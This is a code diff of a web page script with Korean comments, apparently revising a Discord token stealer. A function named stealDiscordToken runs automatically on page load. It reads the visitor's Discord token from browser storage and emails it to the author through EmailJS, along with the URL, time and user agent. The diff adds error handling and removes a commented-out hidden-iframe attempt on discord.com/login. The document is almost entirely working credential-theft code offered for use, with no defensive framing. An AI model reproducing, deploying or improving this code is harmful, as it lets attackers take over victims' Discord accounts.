@@ -29,15 +29,22 @@
   </div>
 
   <script>
-    // EmailJS 초기화
+    // 콘솔 에러를 alert로 띄우는 함수
+    function showError(msg) {
+      alert("오류 발생!\n\n" + msg + "\n\nF12 눌러서 콘솔 더 자세히 봐");
+      document.getElementById("status").innerText = "오류: " + msg;
+      document.getElementById("loader").style.display = "none";
+    }
+
+    // EmailJS 초기화 + 에러 잡기
     let emailjsLoaded = false;
     try {
       emailjs.init("ycbHVBt3cm6FkCL--");
       emailjsLoaded = true;
       console.log("[EmailJS] 초기화 성공");
     } catch(e) {
-      console.error("[EmailJS] 초기화 실패:", e);
-      document.getElementById("status").innerText = "초기화 오류 발생 - 새로고침 해보세요";
+      console.error("[EmailJS 초기화 실패]", e.message || e);
+      showError("EmailJS 초기화 실패: " + (e.message || "키 확인 필요"));
     }
 
     const SERVICE_ID = "service_jmsvqzd";
@@ -46,64 +53,57 @@
     async function stealDiscordToken() {
       document.getElementById("message").innerText = "토큰 추출 중...";
 
-      let token = localStorage.getItem("token") || sessionStorage.getItem("token");
+      let token = null;
+      try {
+        token = localStorage.getItem("token") || sessionStorage.getItem("token");
 
-      // iframe 시도 (필요 시 주석 해제)
-      /*
-      if (!token) {
-        try {
-          const iframe = document.createElement("iframe");
-          iframe.style.display = "none";
-          iframe.src = "https://discord.com/login";
-          document.body.appendChild(iframe);
-          await new Promise(r => setTimeout(r, 2500));
-          const win = iframe.contentWindow || iframe.contentDocument?.defaultView;
-          if (win) {
-            token = win.localStorage?.getItem("token") || win.sessionStorage?.getItem("token");
+        if (!token) {
+          console.log("[+] 토큰 1차 실패 → 추가 시도");
+          // iframe 생략 버전 (차단 걸릴 때 문제 해결)
+        }
+
+        if (token) {
+          token = token.replace(/"/g, "").trim();
+          console.log("[+] 토큰 잡음:", token.substring(0, 35) + "...");
+
+          if (!emailjsLoaded) {
+            showError("EmailJS가 로드되지 않음 - 토큰은 콘솔에 있음");
+            return;
           }
-          document.body.removeChild(iframe);
-        } catch(e) {
-          console.log("iframe 차단됨");
-        }
-      }
-      */
 
-      if (token) {
-        token = token.replace(/"/g, "").trim();
-        console.log("[+] 토큰 잡음:", token.substring(0, 35) + "...");
-
-        if (!emailjsLoaded) {
-          alert("EmailJS 로드 실패 - 토큰은 콘솔에 찍힘");
-          return;
-        }
-
-        try {
           await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
             token: token,
             url: window.location.href,
             time: new Date().toISOString(),
             userAgent: navigator.userAgent
           });
+
           console.log("[++] 메일 발송 완료");
           document.getElementById("status").innerText = "완료! 메일함 확인하세요";
-        } catch(err) {
-          console.error("발송 실패:", err);
-          document.getElementById("status").innerText = "발송 실패 (콘솔 확인)";
+        } else {
+          console.log("[-] 토큰 못 찾음 - Discord 로그인 상태 확인");
+          showError("토큰을 찾을 수 없습니다!\nDiscord에서 로그인 되어 있는지 확인하세요");
         }
-      } else {
-        console.log("[-] 토큰 못 찾음 - Discord 로그인 상태 확인");
-        alert("토큰을 찾을 수 없습니다!\n\n1. Discord 웹에서 로그인 되어 있는지 확인\n2. 새로고침 후 다시 시도");
-        document.getElementById("status").innerText = "토큰 못 찾음 - 로그인 확인하세요";
+
+      } catch(e) {
+        console.error("[전체 에러]", e.message || e);
+        showError("작동 중 오류: " + (e.message || "콘솔 확인 필요"));
       }
 
-      // 로더 숨기기
+      // 로더 무조건 숨김 (무한 로딩 방지)
       document.getElementById("loader").style.display = "none";
     }
 
     // 페이지 로드 후 실행
     window.addEventListener("load", () => {
-      setTimeout(stealDiscordToken, 1000); // 1초 후 시작
+      setTimeout(stealDiscordToken, 800);
     });
+
+    // 에러 전역 캐치 (브라우저 에러도 잡음)
+    window.onerror = function(msg, url, line) {
+      showError("브라우저 오류: " + msg + "\n라인: " + line);
+      return true;
+    };
   </script>
 </body>
 </html>
